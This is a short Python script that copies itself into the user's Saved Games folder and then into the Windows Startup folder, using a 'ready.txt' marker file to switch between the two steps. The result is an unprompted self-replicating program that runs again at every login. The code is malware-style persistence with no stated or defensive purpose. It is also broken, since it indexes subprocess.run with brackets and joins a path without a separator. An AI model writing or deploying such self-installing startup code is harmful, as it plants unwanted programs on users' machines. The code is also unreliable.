from pathlib import Path
import shutil
import subprocess

home_dir = Path.home()
current_script = __file__
destination_folder = Path(f"{home_dir}/Saved Games")
destination_folder2 = Path(f"{home_dir}/AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

try:
    with open("ready.txt","r") as f:
        ready=f.read()
        if ready=="1":
            destination_folder.mkdir(parents=True, exist_ok=True)
            shutil.copy(current_script, destination_folder2)
        
except:
    destination_folder.mkdir(parents=True, exist_ok=True)
    shutil.copy(current_script, destination_folder)
    subprocess.run[f"{home_dir}Saved Games/{current_script}"]
    with open("ready.txt","w") as f:
        f.write("1")
